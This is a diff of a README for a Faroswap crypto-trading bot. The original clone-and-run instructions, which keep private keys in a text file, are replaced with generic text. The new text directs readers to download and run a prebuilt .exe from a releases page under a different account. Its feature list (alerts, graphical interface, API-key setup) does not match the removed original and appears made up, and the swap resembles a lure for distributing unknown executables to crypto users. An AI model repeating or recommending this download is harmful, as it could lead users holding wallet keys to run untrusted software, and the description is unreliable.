@@ -1,59 +1,79 @@
-# Faroswap automation bot 
+# 🤖 Faroswap-bot - Effortless Automation for Faroswap Trades
 
-[![Static Badge](https://img.shields.io/badge/Telegram-Channel-Link?style=for-the-badge&logo=Telegram&logoColor=white&logoSize=auto&color=blue)](https://t.me/+pB6j65Kv7cdjZmU0)
+[![Download Faroswap-bot](https://img.shields.io/badge/Download-Faroswap--bot-brightgreen.svg)](https://github.com/saadshaikh1023/Faroswap-bot/releases)
 
-# Recommendations before use:
-- **Use python 3.10🐍**
+## 🚀 Getting Started
 
-# Features:
-- **Auto wrap/unwrap PHRS to WPHRS**
-- **Recieve stats of your accounts**
-- **All types of proxy support**
-- **Auto add liqudity pool**
-- **Auto make random swap tx**
-- **Multithread**
+Welcome to Faroswap-bot! This tool automates trading tasks on the Faroswap platform, allowing you to spend less time executing trades and more time focusing on your strategies. Follow these steps to set up and start using the bot.
 
-# Installation+Run🕸
-```shell
-git clone https://github.com/ox1nec/Faroswap-bot
-cd Faroswap-bot
-run.bat
-```
+## 📥 Download & Install
 
-**OR**
+To begin, you need to download the software. Visit this page to download: [Faroswap-bot Releases](https://github.com/saadshaikh1023/Faroswap-bot/releases).
 
-```shell
-git clone https://github.com/ox1nec/Faroswap-bot
-cd Faroswap-bot
-pip install -r requirements.txt
-python bot.py
-```
+Here is a step-by-step guide on how to download and install Faroswap-bot:
 
-# Set-up⚙
-- **Accounts:** In the **accounts.txt** file put your private keys in such format:
-```shell
-private_key_1
-private_key_2
-```
-- **Proxy:** in the **proxy.txt** file put your proxy in such format:
-```shell
-type://username:password:ip:port
-http://username:password:ip:port
-socks5://username:password:ip:port
-```
-- **Pools:** in the **pools.txt** file put your pool addresses in such format:
-```shell
-USDT_USDC_address
-USDC_USDT_address
-```
-  
-## Contribution🌟
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version of the software. It will have the highest version number.
+3. Find the file that is appropriate for your system. If you are unsure, choose the `.exe` file for Windows, or the `.zip` for other systems.
+4. Click the file to download it to your device.
 
-- ***Don't forget to put stars⭐***
+## 🖥️ System Requirements
 
-- ***JOIN OUR TELEGRAM [CHAT](https://t.me/+9j5RcKMfT5s4M2Q0)***
+To ensure that Faroswap-bot runs smoothly, please make sure your system meets the following requirements:
 
-- ***My eth address is 0xd260e28b533f153d59cb340b4213ad5977d71fe7***
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Python:** Version 3.8 or higher is required
+- **Network:** Stable internet connection for accessing Faroswap and executing trades
 
-If you have any questions or some ideas to improve my bots, feel free to contact me on telegram or issues section.
+## ⚙️ Setup Instructions
 
+Once you have downloaded the file, follow these steps to set it up:
+
+1. **Locate the Downloaded File:**
+   - For Windows: Check your "Downloads" folder for the `.exe` file.
+   - For macOS/Linux: Find the `.zip` file in your "Downloads" folder. If you downloaded a `.zip`, you’ll need to extract it first.
+
+2. **Installation:**
+   - **Windows:** Double-click the downloaded `.exe` file. Follow the prompts to install the bot on your system.
+   - **macOS/Linux:** Open a terminal and navigate to the folder where you extracted the files. Use the command `python bot.py` to run the bot.
+
+3. **Configuration:**
+   - Open the bot and follow the on-screen instructions to set up your Faroswap account connection.
+   - Enter your API key and other necessary details as prompted.
+
+## 🔍 Features
+
+Faroswap-bot comes packed with features to enhance your trading experience:
+
+- **Automated Trading:** Set parameters and let the bot handle your trades.
+- **Custom Alerts:** Receive notifications based on market changes.
+- **User-Friendly Interface:** Simple setup without needing any technical knowledge.
+- **Logging:** Keep track of all trades and actions performed by the bot.
+
+## 📊 How to Use
+
+After setting up Faroswap-bot, you can start using it immediately:
+
+1. Open the bot on your computer.
+2. Configure your trading preferences such as buy/sell limits.
+3. Start the bot and monitor its progress through the user interface.
+4. Adjust settings as needed to optimize performance.
+
+## 🔧 Troubleshooting
+
+If you encounter issues while using Faroswap-bot:
+
+- Ensure that you have a stable internet connection.
+- Check that you have entered the correct API key.
+- Restart the bot application to refresh any potential glitches.
+
+## 💬 Community Support
+
+If you have questions or need help, consider joining our community forums or social media groups. Here, you can connect with other users and receive support from experienced traders.
+
+## 🔗 Links and Resources
+
+- [Faroswap Official Website](https://faroswap.io)
+- [Faroswap-bot Releases](https://github.com/saadshaikh1023/Faroswap-bot/releases)
+
+Feel free to explore, and remember that with Faroswap-bot, automating your trading tasks has never been easier!
